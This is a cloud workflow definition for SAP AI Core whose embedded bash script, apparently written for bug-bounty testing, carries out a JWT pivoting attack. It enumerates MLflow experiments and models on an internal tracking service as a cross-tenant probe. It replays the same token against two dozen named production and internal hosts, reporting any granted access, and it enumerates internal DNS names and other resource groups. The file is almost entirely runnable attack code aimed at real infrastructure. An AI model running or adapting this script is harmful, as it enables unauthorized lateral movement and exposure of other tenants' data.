apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-exec
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-exec"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-exec"
    ai.sap.com/version: "31.0.0"
spec:
  entrypoint: main
  arguments:
    parameters:
    - name: jwt
      description: "API JWT token"
  templates:
  - name: main
    inputs:
      parameters:
      - name: jwt
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      env:
      - name: API_JWT
        value: "{{inputs.parameters.jwt}}"
      command:
      - bash
      - -c
      - |
        echo "=== V31 JWT PIVOTING + CROSS-ENV ACCESS ==="
        echo "=== $(date -u) ==="
        echo "[*] JWT length: ${#API_JWT}"

        # -------------------------------------------------------
        # PHASE 1: MLflow with API JWT
        # -------------------------------------------------------
        echo "=== PHASE1: MLFLOW CROSS-TENANT ==="
        echo "[*] MLflow experiments list:"
        curl -s --connect-timeout 5 \
          -H "Authorization: Bearer ${API_JWT}" \
          "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/experiments/list" 2>&1 | head -c 3000
        echo ""

        echo "[*] MLflow experiments search:"
        curl -s --connect-timeout 5 \
          -H "Authorization: Bearer ${API_JWT}" \
          "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/experiments/search?max_results=100" 2>&1 | head -c 3000
        echo ""

        echo "[*] MLflow runs search (all experiments):"
        curl -s --connect-timeout 5 -X POST \
          -H "Authorization: Bearer ${API_JWT}" \
          -H "Content-Type: application/json" \
          -d '{"max_results":10}' \
          "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/runs/search" 2>&1 | head -c 3000
        echo ""

        echo "[*] MLflow registered models:"
        curl -s --connect-timeout 5 \
          -H "Authorization: Bearer ${API_JWT}" \
          "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/registered-models/list?max_results=100" 2>&1 | head -c 3000
        echo ""

        # -------------------------------------------------------
        # PHASE 2: Test external SAP AI Core hosts with JWT
        # From inside the pod (internal network)
        # -------------------------------------------------------
        echo "=== PHASE2: CROSS-ENVIRONMENT JWT TEST ==="

        # High-value targets first
        for host in \
          "internalprod-1.eu-central-1.aws.ml.hana.ondemand.com" \
          "internalprod-2.eu-central-1.aws.ml.hana.ondemand.com" \
          "internalprod-3.eu-central-1.aws.ml.hana.ondemand.com" \
          "internalprod.eu-central-1.aws.ml.hana.ondemand.com" \
          "prod-eu-1.eu-central-1.aws.ml.hana.ondemand.com" \
          "prod-eu-2.eu-central-1.aws.ml.hana.ondemand.com" \
          "prod-eu-3.eu-central-1.aws.ml.hana.ondemand.com" \
          "prod-eu-4.eu-central-1.aws.ml.hana.ondemand.com" \
          "prod-eu-5.eu-central-1.aws.ml.hana.ondemand.com" \
          "prod.eu-central-1.aws.ml.hana.ondemand.com" \
          "preprod.eu-central-1.aws.ml.hana.ondemand.com" \
          "sec-eu10.eu-central-1.aws.ml.hana.ondemand.com" \
          "trial.eu-central-1.aws.ml.hana.ondemand.com" \
          "training.eu-central-1.aws.ml.hana.ondemand.com" \
          "prod-us-1.us-east-1.aws.ml.hana.ondemand.com" \
          "prod-us-2.us-east-1.aws.ml.hana.ondemand.com" \
          "prod.us-east-1.aws.ml.hana.ondemand.com" \
          "preprod.us-east-1.aws.ml.hana.ondemand.com" \
          "prod.ap-northeast-1.aws.ml.hana.ondemand.com" \
          "prod.ap-southeast-2.aws.ml.hana.ondemand.com" \
          "intprod-eu12.eu-central-1.aws.ml.hana.ondemand.com" \
          "prodeuonly.eu-central-1.aws.ml.hana.ondemand.com" \
          "bocr-eu-prd.eu-central-1.aws.ml.hana.ondemand.com" \
          "bocr-us-prod.us-east-1.aws.ml.hana.ondemand.com" \
          "workshop.eu-central-1.aws.ml.hana.ondemand.com" \
          "perf-eu10.eu-central-1.aws.ml.hana.ondemand.com"; do

          # Quick check: resolve + hit /v2/lm/scenarios with our JWT
          resp=$(curl -sk --connect-timeout 3 --max-time 5 \
            -o /tmp/host_resp.txt -w "%{http_code}" \
            -H "Authorization: Bearer ${API_JWT}" \
            -H "AI-Resource-Group: default" \
            "https://${host}/v2/lm/scenarios" 2>/dev/null)

          if [ "$resp" != "000" ]; then
            body=$(head -c 200 /tmp/host_resp.txt)
            echo "[${resp}] ${host}"
            if [ "$resp" = "200" ]; then
              echo "  >>> ACCESS GRANTED: ${body}"
            elif [ "$resp" != "401" ] && [ "$resp" != "403" ] && [ "$resp" != "404" ]; then
              echo "  >>> ${body}"
            fi
          fi
        done

        # -------------------------------------------------------
        # PHASE 3: Internal-only hosts (may only resolve from inside)
        # -------------------------------------------------------
        echo "=== PHASE3: INTERNAL DNS RESOLUTION ==="
        for host in \
          "internalprod-1.eu-central-1.aws.ml.hana.ondemand.com" \
          "internalprod-2.eu-central-1.aws.ml.hana.ondemand.com" \
          "internalprod-3.eu-central-1.aws.ml.hana.ondemand.com" \
          "training.internalprod.eu-central-1.aws.ml.hana.ondemand.com" \
          "esam.prod.eu-central-1.aws.ml.hana.ondemand.com" \
          "esam.preprod.eu-central-1.aws.ml.hana.ondemand.com"; do
          ip=$(nslookup "$host" 2>/dev/null | grep "Address:" | tail -1 | awk '{print $2}')
          if [ -n "$ip" ] && [ "$ip" != "100.104.0.10" ]; then
            echo "[+] ${host} -> ${ip}"
          fi
        done

        # -------------------------------------------------------
        # PHASE 4: Same JWT against our own API but from inside
        # -------------------------------------------------------
        echo "=== PHASE4: API FROM INSIDE POD ==="
        echo "[*] Scenarios via API:"
        curl -s --connect-timeout 5 \
          -H "Authorization: Bearer ${API_JWT}" \
          -H "AI-Resource-Group: default" \
          "https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com/v2/lm/scenarios" 2>&1 | head -c 500
        echo ""

        # Try accessing other resource groups
        echo "[*] Executions with bb-test-rg:"
        curl -s --connect-timeout 5 \
          -H "Authorization: Bearer ${API_JWT}" \
          -H "AI-Resource-Group: bb-test-rg" \
          "https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com/v2/lm/executions" 2>&1 | head -c 500
        echo ""

        echo "=== V31 DONE $(date -u) ==="
